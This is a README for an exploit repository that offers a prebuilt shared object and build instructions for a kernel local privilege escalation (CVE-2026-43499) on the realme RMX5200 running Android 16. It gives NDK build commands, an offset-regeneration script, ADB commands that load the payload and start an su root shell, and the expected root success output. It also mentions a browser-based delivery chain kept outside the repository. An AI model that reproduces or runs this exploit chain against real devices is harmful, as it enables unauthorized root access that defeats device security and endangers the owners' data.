# CVE-2026-43499 for realme RMX5200

CVE-2026-43499 local privilege escalation **SO** for:

| Item | Value |
|------|--------|
| Device | realme **RMX5200** / RE6030L1 |
| Android | 16 |
| Kernel | `6.12.23-android16-5-gb2a876903b49-ab14541642-4k` |
| Fingerprint | `realme/RMX5200/RE6030L1:16/BP2A.250605.015/...:user/release-keys` |

Prebuilt binary: [`bin/preload.so`](bin/preload.so)

This repo keeps **only the SO build tree** (sources + offsets + prebuilt). No browser harness, no firmware dumps, no test scaffolding.

Based on the public IonStack / popsicle-style chain; offsets regenerated from this device's `boot.img` + `xbl_config.img`.

---

## Layout

```text
.
├── bin/preload.so              # prebuilt aarch64 shared object (verified)
├── generate_target.py          # optional: regenerate target.h from boot+xbl
├── source/
│   ├── Makefile
│   └── src/
│       ├── target.h            # RMX5200 offsets
│       ├── main.c preload.c slide.c ...
│       └── kernelsnitch/
└── README.md
```

---

## Build

Requirements:

- Android NDK (r27+ recommended)
- Python 3 + `llvm-objdump` (only if regenerating `target.h`)

### With make

```sh
# Linux NDK example
export NDK_ROOT=/path/to/android-ndk
make -C source clean preload

# Windows NDK example
make -C source clean preload \
  NDK_ROOT="/c/Users/YOU/AppData/Local/Android/Sdk/ndk/27.2.12479018" \
  NDK_TOOLCHAIN="/c/Users/YOU/AppData/Local/Android/Sdk/ndk/27.2.12479018/toolchains/llvm/prebuilt/windows-x86_64"
```

Output:

```text
source/build/bin/preload.so
```

### Without make (clang direct)

```sh
cd source
mkdir -p build/bin build/embed
CC="$NDK_TOOLCHAIN/bin/aarch64-linux-android35-clang"

$CC -O2 -Isrc -fPIE -pie -DTARGET_CONFIG_H=\"target.h\" \
  src/su_daemon.c -o build/embed/su_daemon_aarch64_pie

$CC -O2 -Isrc -fPIC -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function \
  -DTARGET_CONFIG_H=\"target.h\" \
  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c \
  src/preload.c src/su_blob.S \
  -shared -o build/bin/preload.so -pthread
```

### Regenerate offsets (optional)

Need matching firmware images (not shipped here):

```sh
python3 generate_target.py \
  --boot boot.img \
  --xbl-config xbl_config.img \
  --llvm-objdump llvm-objdump \
  -o source/src/target.h
```

---

## Run

### ADB LD_PRELOAD

```sh
adb push bin/preload.so /data/local/tmp/preload.so
adb shell 'chmod 0644 /data/local/tmp/preload.so'
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/true'
adb shell '/data/local/tmp/su -c id'
```

### Browser chain (external)

Load this `preload.so` via a Firefox-151 lonStack-style host (e.g. Rootme device entry). Not included in this repository.

Success markers:

```text
slide-kaslr-ok
direct credential result uid=0 ...
local su binary ready path=/data/local/tmp/su
direct-root-summary root=1 ...
```

```text
uid=0(root) gid=0(root) ... context=kernel
```

---

## Notes

- **Temporary root only** — lost after reboot.
- After success, some apps may fail Framework init until reboot (same class of side effect as related public targets).
- Offsets are **build-specific**. Other OTA builds need a new `target.h` / rebuild.
- For authorized security research on devices you own.

---

## Credits

- Public research context: IonStack / CVE-2026-43499 writeups
- Implementation lineage: popsicle-style `preload.so` chain
- Device adaptation: RMX5200 (RE6030L1)
